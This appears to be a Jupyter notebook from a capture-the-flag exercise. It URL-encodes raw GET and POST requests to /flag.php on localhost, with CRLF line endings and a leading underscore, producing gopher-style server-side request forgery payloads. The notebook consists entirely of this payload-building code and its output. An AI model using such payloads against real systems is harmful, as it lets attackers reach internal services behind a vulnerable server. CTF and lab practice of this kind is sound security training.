{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "1fc31081-d0fe-4a78-9021-0704c0ed8b00",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'_GET%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0A'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import urllib\n",
    "\n",
    "test = \"\"\"GET /flag.php HTTP/1.1\n",
    "Host: 127.0.0.1\n",
    "\"\"\"\n",
    "\n",
    "payload = \"_\" + urllib.parse.quote(test).replace(\"%0A\", \"%0D%0A\")\n",
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "9f6c85ef-558d-42a5-9705-0dcedd4dc100",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2014%0D%0A%0D%0Agivemeflag%3Dyes%0D%0A'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test = \"\"\"POST /flag.php HTTP/1.1\n",
    "Host: 127.0.0.1\n",
    "Content-Type: application/x-www-form-urlencoded\n",
    "Content-Length: 14\n",
    "\n",
    "givemeflag=yes\n",
    "\"\"\"\n",
    "\n",
    "payload = \"_\" + urllib.parse.quote(test).replace(\"%0A\", \"%0D%0A\")\n",
    "payload"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
